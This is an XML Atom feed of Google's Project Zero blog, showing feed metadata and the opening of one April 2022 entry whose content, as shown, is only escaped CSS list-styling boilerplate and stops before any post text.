<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet href="http://www.blogger.com/styles/atom.css" type="text/css"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:openSearch="http://a9.com/-/spec/opensearchrss/1.0/" xmlns:blogger="http://schemas.google.com/blogger/2008" xmlns:georss="http://www.georss.org/georss" xmlns:gd="http://schemas.google.com/g/2005" xmlns:thr="http://purl.org/syndication/thread/1.0">
  <id>tag:blogger.com,1999:blog-4838136820032157985</id>
  <updated>2022-05-04T18:09:58.736-07:00</updated>
  <category term="windows" />
  <title type="text">Project Zero</title>
  <subtitle type="html">News and updates from the Project Zero team at Google</subtitle>
  <link rel="http://schemas.google.com/g/2005#feed" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/posts/default" />
  <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default" />
  <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/" />
  <link rel="hub" href="http://pubsubhubbub.appspot.com/" />
  <link rel="next" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default?start-index=26&amp;max-results=25" />
  <author>
    <name>taviso</name>
    <uri>http://www.blogger.com/profile/00625649251729449405</uri>
    <email>noreply@blogger.com</email>
    <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
  </author>
  <generator version="7.00" uri="http://www.blogger.com">Blogger</generator>
  <openSearch:totalResults>196</openSearch:totalResults>
  <openSearch:startIndex>1</openSearch:startIndex>
  <openSearch:itemsPerPage>25</openSearch:itemsPerPage>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-3023870154175197326</id>
    <published>2022-04-19T09:06:00.000-07:00</published>
    <updated>2022-04-19T09:06:36.412-07:00</updated>
    <title type="text">The More You Know, The More You Know You Don’t Know</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');.lst-kix_qhs0t3wlsx02-8&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-8}ol.lst-kix_h2vtkcla8l9d-2.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-2 0}ul.lst-kix_9i24fh2252ug-1{list-style-type:none}.lst-kix_h2vtkcla8l9d-3&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-3}ul.lst-kix_9i24fh2252ug-0{list-style-type:none}ul.lst-kix_9i24fh2252ug-3{list-style-type:none}ul.lst-kix_9i24fh2252ug-2{list-style-type:none}ul.lst-kix_9i24fh2252ug-5{list-style-type:none}ul.lst-kix_9i24fh2252ug-4{list-style-type:none}ul.lst-kix_9i24fh2252ug-7{list-style-type:none}.lst-kix_czzguda5pqu4-1&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-1}ul.lst-kix_9i24fh2252ug-6{list-style-type:none}.lst-kix_jdourvkzhmg1-7&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-7}ul.lst-kix_9i24fh2252ug-8{list-style-type:none}ul.lst-kix_grz5i5wr9ig-0{list-style-type:none}ul.lst-kix_grz5i5wr9ig-2{list-style-type:none}ul.lst-kix_grz5i5wr9ig-1{list-style-type:none}ul.lst-kix_grz5i5wr9ig-4{list-style-type:none}ul.lst-kix_718o7hzyu4f-1{list-style-type:none}ul.lst-kix_grz5i5wr9ig-3{list-style-type:none}ul.lst-kix_718o7hzyu4f-2{list-style-type:none}ul.lst-kix_grz5i5wr9ig-6{list-style-type:none}ul.lst-kix_grz5i5wr9ig-5{list-style-type:none}ul.lst-kix_718o7hzyu4f-0{list-style-type:none}ul.lst-kix_grz5i5wr9ig-8{list-style-type:none}ul.lst-kix_grz5i5wr9ig-7{list-style-type:none}ol.lst-kix_czzguda5pqu4-8.start{counter-reset:lst-ctn-kix_czzguda5pqu4-8 0}ul.lst-kix_bqyk3pvm93qj-0{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-8{list-style-type:none}ul.lst-kix_718o7hzyu4f-5{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-7{list-style-type:none}ul.lst-kix_718o7hzyu4f-6{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-6{list-style-type:none}ul.lst-kix_718o7hzyu4f-3{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-8.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-8 0}ol.lst-kix_jdourvkzhmg1-4.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-4 0}ul.lst-kix_bqyk3pvm93qj-5{list-style-type:none}ul.lst-kix_718o7hzyu4f-4{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-4{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-3{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-2{list-style-type:none}ul.lst-kix_718o7hzyu4f-7{list-style-type:none}ul.lst-kix_bqyk3pvm93qj-1{list-style-type:none}ul.lst-kix_718o7hzyu4f-8{list-style-type:none}.lst-kix_g56cmc7ljnve-4&gt;li:before{content:"\0025cb  "}.lst-kix_g56cmc7ljnve-5&gt;li:before{content:"\0025a0  "}.lst-kix_1mxsacho6zj1-0&gt;li:before{content:"\0025cf  "}.lst-kix_1mxsacho6zj1-1&gt;li:before{content:"\0025cb  "}.lst-kix_9i24fh2252ug-1&gt;li:before{content:"\0025cb  "}ol.lst-kix_qhs0t3wlsx02-3.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-3 0}.lst-kix_qhs0t3wlsx02-4&gt;li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-4,lower-latin) ". "}.lst-kix_qhs0t3wlsx02-6&gt;li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-6,decimal) ". "}ol.lst-kix_h2vtkcla8l9d-7.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-7 0}.lst-kix_g56cmc7ljnve-3&gt;li:before{content:"\0025cf  "}.lst-kix_g56cmc7ljnve-7&gt;li:before{content:"\0025cb  "}.lst-kix_9i24fh2252ug-0&gt;li:before{content:"\0025cf  "}.lst-kix_qhs0t3wlsx02-5&gt;li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-5,lower-roman) ". "}.lst-kix_g56cmc7ljnve-0&gt;li:before{content:"\0025cf  "}.lst-kix_g56cmc7ljnve-1&gt;li:before{content:"\0025cb  "}.lst-kix_g56cmc7ljnve-8&gt;li:before{content:"\0025a0  "}.lst-kix_qhs0t3wlsx02-8&gt;li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-8,lower-roman) ". "}.lst-kix_9i24fh2252ug-3&gt;li:before{content:"\0025cf  "}.lst-kix_qhs0t3wlsx02-0&gt;li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-0,decimal) ". "}.lst-kix_h2vtkcla8l9d-1&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-1}.lst-kix_qhs0t3wlsx02-7&gt;li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-7,lower-latin) ". "}.lst-kix_g56cmc7ljnve-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_rvy0q9fw47sg-8{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-7{list-style-type:none}.lst-kix_9i24fh2252ug-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_rvy0q9fw47sg-6{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-5{list-style-type:none}.lst-kix_czzguda5pqu4-8&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-8}ul.lst-kix_rvy0q9fw47sg-4{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-3{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-2{list-style-type:none}.lst-kix_qhs0t3wlsx02-4&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-4}ul.lst-kix_bfmkl5o48mun-0{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-1{list-style-type:none}ul.lst-kix_rvy0q9fw47sg-0{list-style-type:none}ul.lst-kix_bfmkl5o48mun-2{list-style-type:none}ul.lst-kix_bfmkl5o48mun-1{list-style-type:none}.lst-kix_h2vtkcla8l9d-7&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-7}.lst-kix_g56cmc7ljnve-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_3zaknyhdqv25-0{list-style-type:none}ul.lst-kix_3zaknyhdqv25-2{list-style-type:none}ul.lst-kix_3zaknyhdqv25-1{list-style-type:none}ul.lst-kix_3zaknyhdqv25-4{list-style-type:none}ul.lst-kix_3zaknyhdqv25-3{list-style-type:none}ul.lst-kix_3zaknyhdqv25-6{list-style-type:none}ul.lst-kix_3zaknyhdqv25-5{list-style-type:none}ul.lst-kix_3zaknyhdqv25-8{list-style-type:none}ul.lst-kix_3zaknyhdqv25-7{list-style-type:none}.lst-kix_jdourvkzhmg1-5&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-5}ul.lst-kix_givsp5ka59r-1{list-style-type:none}ul.lst-kix_givsp5ka59r-2{list-style-type:none}ul.lst-kix_givsp5ka59r-3{list-style-type:none}ul.lst-kix_givsp5ka59r-4{list-style-type:none}ul.lst-kix_givsp5ka59r-0{list-style-type:none}.lst-kix_qhs0t3wlsx02-1&gt;li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-1,lower-latin) ". "}.lst-kix_qhs0t3wlsx02-2&gt;li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-2,lower-roman) ". "}.lst-kix_qhs0t3wlsx02-3&gt;li:before{content:"" counter(lst-ctn-kix_qhs0t3wlsx02-3,decimal) ". "}ol.lst-kix_qhs0t3wlsx02-8.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-8 0}.lst-kix_qhs0t3wlsx02-2&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-2}.lst-kix_h2vtkcla8l9d-1&gt;li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-1,lower-latin) ". "}ul.lst-kix_givsp5ka59r-5{list-style-type:none}ul.lst-kix_givsp5ka59r-6{list-style-type:none}.lst-kix_jdourvkzhmg1-8&gt;li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-8,lower-roman) ". "}ul.lst-kix_givsp5ka59r-7{list-style-type:none}.lst-kix_rvy0q9fw47sg-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_givsp5ka59r-8{list-style-type:none}ol.lst-kix_jdourvkzhmg1-3.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-3 0}.lst-kix_czzguda5pqu4-5&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-5}.lst-kix_h2vtkcla8l9d-3&gt;li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-3,decimal) ". "}.lst-kix_h2vtkcla8l9d-5&gt;li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-5,lower-roman) ". "}.lst-kix_jdourvkzhmg1-2&gt;li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-2,lower-roman) ". "}.lst-kix_jdourvkzhmg1-6&gt;li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-6,decimal) ". "}.lst-kix_rvy0q9fw47sg-2&gt;li:before{content:"\0025a0  "}ol.lst-kix_czzguda5pqu4-7.start{counter-reset:lst-ctn-kix_czzguda5pqu4-7 0}.lst-kix_3zaknyhdqv25-7&gt;li:before{content:"\0025cb  "}.lst-kix_jdourvkzhmg1-4&gt;li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-4,lower-latin) ". "}.lst-kix_rvy0q9fw47sg-0&gt;li:before{content:"\0025cf  "}ol.lst-kix_h2vtkcla8l9d-1.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-1 0}.lst-kix_bqyk3pvm93qj-0&gt;li:before{content:"\0025cf  "}.lst-kix_3zaknyhdqv25-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_bfmkl5o48mun-4{list-style-type:none}ul.lst-kix_bfmkl5o48mun-3{list-style-type:none}.lst-kix_h2vtkcla8l9d-7&gt;li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-7,lower-latin) ". "}ul.lst-kix_bfmkl5o48mun-6{list-style-type:none}ul.lst-kix_bfmkl5o48mun-5{list-style-type:none}ul.lst-kix_bfmkl5o48mun-8{list-style-type:none}ul.lst-kix_bfmkl5o48mun-7{list-style-type:none}.lst-kix_czzguda5pqu4-7&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-7}.lst-kix_jdourvkzhmg1-0&gt;li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-0,decimal) ". "}.lst-kix_3zaknyhdqv25-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_knibgsincpme-7{list-style-type:none}.lst-kix_9i24fh2252ug-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_knibgsincpme-8{list-style-type:none}.lst-kix_rwsfzn4jdl6v-7&gt;li:before{content:"\0025cb  "}ol.lst-kix_qhs0t3wlsx02-0.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-0 0}.lst-kix_rvy0q9fw47sg-6&gt;li:before{content:"\0025cf  "}.lst-kix_1mxsacho6zj1-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_knibgsincpme-1{list-style-type:none}ul.lst-kix_knibgsincpme-2{list-style-type:none}.lst-kix_9i24fh2252ug-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_knibgsincpme-0{list-style-type:none}ul.lst-kix_knibgsincpme-5{list-style-type:none}.lst-kix_1mxsacho6zj1-2&gt;li:before{content:"\0025a0  "}ul.lst-kix_knibgsincpme-6{list-style-type:none}ul.lst-kix_knibgsincpme-3{list-style-type:none}.lst-kix_rvy0q9fw47sg-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_knibgsincpme-4{list-style-type:none}.lst-kix_3zaknyhdqv25-1&gt;li:before{content:"\0025cb  "}.lst-kix_givsp5ka59r-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_1mxsacho6zj1-4{list-style-type:none}ul.lst-kix_1mxsacho6zj1-5{list-style-type:none}ul.lst-kix_1mxsacho6zj1-2{list-style-type:none}.lst-kix_grz5i5wr9ig-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_1mxsacho6zj1-3{list-style-type:none}.lst-kix_jdourvkzhmg1-3&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-3}ul.lst-kix_1mxsacho6zj1-0{list-style-type:none}.lst-kix_1mxsacho6zj1-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_1mxsacho6zj1-1{list-style-type:none}.lst-kix_givsp5ka59r-6&gt;li:before{content:"\0025cf  "}.lst-kix_1mxsacho6zj1-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_1mxsacho6zj1-8{list-style-type:none}.lst-kix_rwsfzn4jdl6v-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_1mxsacho6zj1-6{list-style-type:none}ul.lst-kix_1mxsacho6zj1-7{list-style-type:none}.lst-kix_givsp5ka59r-8&gt;li:before{content:"\0025a0  "}.lst-kix_rwsfzn4jdl6v-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_jdourvkzhmg1-5.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-5 0}ol.lst-kix_h2vtkcla8l9d-4.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-4 0}.lst-kix_jdourvkzhmg1-4&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-4}ol.lst-kix_jdourvkzhmg1-6.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-6 0}.lst-kix_rwsfzn4jdl6v-1&gt;li:before{content:"\0025cb  "}.lst-kix_h2vtkcla8l9d-8&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-8}.lst-kix_qhs0t3wlsx02-3&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-3}.lst-kix_czzguda5pqu4-7&gt;li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-7,lower-latin) ". "}.lst-kix_czzguda5pqu4-3&gt;li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-3,decimal) ". "}.lst-kix_czzguda5pqu4-5&gt;li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-5,lower-roman) ". "}ol.lst-kix_h2vtkcla8l9d-3.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-3 0}.lst-kix_knibgsincpme-1&gt;li:before{content:"\0025cb  "}.lst-kix_czzguda5pqu4-1&gt;li:before{content:"" counter(lst-ctn-kix_czzguda5pqu4-1,lower-latin) ". "}.lst-kix_czzguda5pqu4-6&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-6}.lst-kix_h2vtkcla8l9d-2&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-2}.lst-kix_knibgsincpme-5&gt;li:before{content:"\0025a0  "}.lst-kix_knibgsincpme-4&gt;li:before{content:"\0025cb  "}.lst-kix_knibgsincpme-6&gt;li:before{content:"\0025cf  "}.lst-kix_knibgsincpme-3&gt;li:before{content:"\0025cf  "}.lst-kix_knibgsincpme-7&gt;li:before{content:"\0025cb  "}.lst-kix_jdourvkzhmg1-6&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-6}.lst-kix_czzguda5pqu4-0&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-0}.lst-kix_h2vtkcla8l9d-4&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-4}ol.lst-kix_jdourvkzhmg1-5{list-style-type:none}ol.lst-kix_jdourvkzhmg1-6{list-style-type:none}ol.lst-kix_jdourvkzhmg1-7.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-7 0}ol.lst-kix_jdourvkzhmg1-7{list-style-type:none}ol.lst-kix_jdourvkzhmg1-8{list-style-type:none}.lst-kix_qhs0t3wlsx02-7&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-7}.lst-kix_bfmkl5o48mun-0&gt;li:before{content:"\0025cf  "}ol.lst-kix_qhs0t3wlsx02-1.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-1 0}ol.lst-kix_czzguda5pqu4-0.start{counter-reset:lst-ctn-kix_czzguda5pqu4-0 0}.lst-kix_knibgsincpme-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_h2vtkcla8l9d-7{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-8{list-style-type:none}.lst-kix_bfmkl5o48mun-7&gt;li:before{content:"\0025cb  "}.lst-kix_bfmkl5o48mun-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_h2vtkcla8l9d-3{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-4{list-style-type:none}ol.lst-kix_jdourvkzhmg1-1.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-1 0}.lst-kix_bfmkl5o48mun-6&gt;li:before{content:"\0025cf  "}ol.lst-kix_h2vtkcla8l9d-5{list-style-type:none}ol.lst-kix_czzguda5pqu4-5.start{counter-reset:lst-ctn-kix_czzguda5pqu4-5 0}ol.lst-kix_h2vtkcla8l9d-6{list-style-type:none}.lst-kix_grz5i5wr9ig-7&gt;li:before{content:"\0025cb  "}.lst-kix_bfmkl5o48mun-1&gt;li:before{content:"\0025cb  "}.lst-kix_czzguda5pqu4-2&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-2}ol.lst-kix_qhs0t3wlsx02-6.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-6 0}.lst-kix_grz5i5wr9ig-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_jdourvkzhmg1-1{list-style-type:none}ol.lst-kix_jdourvkzhmg1-2{list-style-type:none}ol.lst-kix_jdourvkzhmg1-3{list-style-type:none}ol.lst-kix_jdourvkzhmg1-4{list-style-type:none}.lst-kix_grz5i5wr9ig-3&gt;li:before{content:"\0025cf  "}.lst-kix_grz5i5wr9ig-5&gt;li:before{content:"\0025a0  "}.lst-kix_bfmkl5o48mun-2&gt;li:before{content:"\0025a0  "}ol.lst-kix_jdourvkzhmg1-0{list-style-type:none}.lst-kix_grz5i5wr9ig-2&gt;li:before{content:"\0025a0  "}.lst-kix_grz5i5wr9ig-6&gt;li:before{content:"\0025cf  "}ol.lst-kix_h2vtkcla8l9d-0{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-5.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-5 0}.lst-kix_bfmkl5o48mun-3&gt;li:before{content:"\0025cf  "}.lst-kix_bfmkl5o48mun-4&gt;li:before{content:"\0025cb  "}ol.lst-kix_h2vtkcla8l9d-1{list-style-type:none}ol.lst-kix_h2vtkcla8l9d-2{list-style-type:none}.lst-kix_bfmkl5o48mun-5&gt;li:before{content:"\0025a0  "}.lst-kix_grz5i5wr9ig-4&gt;li:before{content:"\0025cb  "}.lst-kix_givsp5ka59r-2&gt;li:before{content:"\0025a0  "}ol.lst-kix_h2vtkcla8l9d-0.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-0 0}.lst-kix_givsp5ka59r-1&gt;li:before{content:"\0025cb  "}.lst-kix_givsp5ka59r-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_g56cmc7ljnve-8{list-style-type:none}ol.lst-kix_jdourvkzhmg1-2.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-2 0}.lst-kix_bqyk3pvm93qj-7&gt;li:before{content:"\0025cb  "}.lst-kix_h2vtkcla8l9d-6&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-6}.lst-kix_jdourvkzhmg1-8&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-8}.lst-kix_qhs0t3wlsx02-5&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-5}.lst-kix_bqyk3pvm93qj-6&gt;li:before{content:"\0025cf  "}.lst-kix_bqyk3pvm93qj-4&gt;li:before{content:"\0025cb  "}.lst-kix_h2vtkcla8l9d-0&gt;li{counter-increment:lst-ctn-kix_h2vtkcla8l9d-0}ol.lst-kix_jdourvkzhmg1-8.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-8 0}.lst-kix_bqyk3pvm93qj-5&gt;li:before{content:"\0025a0  "}ol.lst-kix_qhs0t3wlsx02-7.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-7 0}.lst-kix_bqyk3pvm93qj-2&gt;li:before{content:"\0025a0  "}.lst-kix_bqyk3pvm93qj-3&gt;li:before{content:"\0025cf  "}.lst-kix_718o7hzyu4f-5&gt;li:before{content:"\0025a0  "}ol.lst-kix_h2vtkcla8l9d-6.start{counter-reset:lst-ctn-kix_h2vtkcla8l9d-6 0}.lst-kix_718o7hzyu4f-4&gt;li:before{content:"\0025cb  "}.lst-kix_718o7hzyu4f-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_rwsfzn4jdl6v-1{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-2.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-2 0}ul.lst-kix_rwsfzn4jdl6v-2{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-0{list-style-type:none}.lst-kix_718o7hzyu4f-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_rwsfzn4jdl6v-5{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-6{list-style-type:none}.lst-kix_718o7hzyu4f-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_rwsfzn4jdl6v-3{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-4{list-style-type:none}ul.lst-kix_g56cmc7ljnve-3{list-style-type:none}ol.lst-kix_czzguda5pqu4-6{list-style-type:none}ul.lst-kix_g56cmc7ljnve-2{list-style-type:none}ol.lst-kix_czzguda5pqu4-7{list-style-type:none}ul.lst-kix_g56cmc7ljnve-1{list-style-type:none}ol.lst-kix_czzguda5pqu4-4{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-7{list-style-type:none}ul.lst-kix_g56cmc7ljnve-0{list-style-type:none}ol.lst-kix_czzguda5pqu4-5{list-style-type:none}ul.lst-kix_rwsfzn4jdl6v-8{list-style-type:none}ul.lst-kix_g56cmc7ljnve-7{list-style-type:none}.lst-kix_bqyk3pvm93qj-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_czzguda5pqu4-2{list-style-type:none}ul.lst-kix_g56cmc7ljnve-6{list-style-type:none}ol.lst-kix_czzguda5pqu4-3{list-style-type:none}.lst-kix_jdourvkzhmg1-2&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-2}ul.lst-kix_g56cmc7ljnve-5{list-style-type:none}ol.lst-kix_czzguda5pqu4-0{list-style-type:none}.lst-kix_718o7hzyu4f-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_g56cmc7ljnve-4{list-style-type:none}ol.lst-kix_czzguda5pqu4-1{list-style-type:none}.lst-kix_718o7hzyu4f-1&gt;li:before{content:"\0025cb  "}ol.lst-kix_czzguda5pqu4-6.start{counter-reset:lst-ctn-kix_czzguda5pqu4-6 0}.lst-kix_718o7hzyu4f-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_czzguda5pqu4-8{list-style-type:none}.lst-kix_718o7hzyu4f-2&gt;li:before{content:"\0025a0  "}ol.lst-kix_jdourvkzhmg1-0.start{counter-reset:lst-ctn-kix_jdourvkzhmg1-0 0}ol.lst-kix_czzguda5pqu4-4.start{counter-reset:lst-ctn-kix_czzguda5pqu4-4 0}.lst-kix_h2vtkcla8l9d-0&gt;li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-0,decimal) ". "}.lst-kix_jdourvkzhmg1-7&gt;li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-7,lower-latin) ". "}ol.lst-kix_qhs0t3wlsx02-5.start{counter-reset:lst-ctn-kix_qhs0t3wlsx02-5 0}.lst-kix_jdourvkzhmg1-0&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-0}.lst-kix_h2vtkcla8l9d-4&gt;li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-4,lower-latin) ". "}.lst-kix_jdourvkzhmg1-3&gt;li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-3,decimal) ". "}.lst-kix_rvy0q9fw47sg-3&gt;li:before{content:"\0025cf  "}.lst-kix_h2vtkcla8l9d-2&gt;li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-2,lower-roman) ". "}.lst-kix_h2vtkcla8l9d-6&gt;li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-6,decimal) ". "}.lst-kix_rvy0q9fw47sg-1&gt;li:before{content:"\0025cb  "}.lst-kix_jdourvkzhmg1-1&gt;li{counter-increment:lst-ctn-kix_jdourvkzhmg1-1}.lst-kix_3zaknyhdqv25-8&gt;li:before{content:"\0025a0  "}.lst-kix_jdourvkzhmg1-5&gt;li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-5,lower-roman) ". "}.lst-kix_qhs0t3wlsx02-1&gt;li{counter-increment:lst-ctn-kix_qhs0t3wlsx02-1}.lst-kix_3zaknyhdqv25-2&gt;li:before{content:"\0025a0  "}.lst-kix_3zaknyhdqv25-4&gt;li:before{content:"\0025cb  "}.lst-kix_bqyk3pvm93qj-1&gt;li:before{content:"\0025cb  "}.lst-kix_h2vtkcla8l9d-8&gt;li:before{content:"" counter(lst-ctn-kix_h2vtkcla8l9d-8,lower-roman) ". "}.lst-kix_czzguda5pqu4-4&gt;li{counter-increment:lst-ctn-kix_czzguda5pqu4-4}.lst-kix_3zaknyhdqv25-6&gt;li:before{content:"\0025cf  "}.lst-kix_jdourvkzhmg1-1&gt;li:before{content:"" counter(lst-ctn-kix_jdourvkzhmg1-1,lower-latin) ". "}.lst-kix_rwsfzn4jdl6v-6&gt;li:before{content:"\0025cf  "}ol.lst-kix_czzguda5pqu4-1.start{counter-reset:lst-ctn-kix_czzguda5pqu4-1 0}.lst-kix_rvy0q9fw47sg-5&gt;li:before{content:"\0025a0  "}.lst-kix_9i24fh2252ug-4&gt;li:before{content:"\0025cb  "}.lst-kix_9i24fh2252ug-8&gt;li:before{content:"\0025a0  "}.lst-kix_rwsfzn4jdl6v-8&gt;li:before{content:"\0025a0  "}.lst-kix_rvy0q9fw47sg-7&gt;li:before{content:"\0025cb  "}.lst-kix_1mxsacho6zj1-3&gt;li:before{content:"\0025cf  "}.lst-kix_3zaknyhdqv25-0&gt;li:before{content:"\0025cf  "}.lst-kix_9i24fh2252ug-6&gt;li:before{content:"\0025cf  "}.lst-kix_givsp5ka59r-3&gt;li:before{content:"\0025cf  "}ol.lst-kix_qhs0t3wlsx02-8{list-style-type:none}.lst-kix_1mxsacho6zj1-5&gt;li:before{content:"\0025a0  "}.lst-kix_givsp5ka59r-5&gt;li:before{content:"\0025a0  "}.lst-kix_givsp5ka59r-7&gt;li:before{content:"\0025cb  "}.lst-kix_grz5i5wr9ig-0&gt;li:before{content:"\0025cf  "}.lst-kix_1mxsacho6zj1-7&gt;li:before{content:"\0025cb  "}.lst-kix_rwsfzn4jdl6v-4&gt;li:before{content:"\0025cb  "}ol.lst-kix_qhs0t3wlsx02-3{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-2{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-1{list-style-type:none}ol.lst-kix_czzguda5pqu4-2.start{counter-reset:lst-ctn-kix_czzguda5pqu4-2 0}ol.lst-kix_qhs0t3wlsx02-0{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-7{list-style-type:none}ol.lst-kix_qhs0t3wlsx02-6{list-style-type:none}.lst-kix_rwsfzn4jdl6v-2&gt;li:before{content:"\0025a0  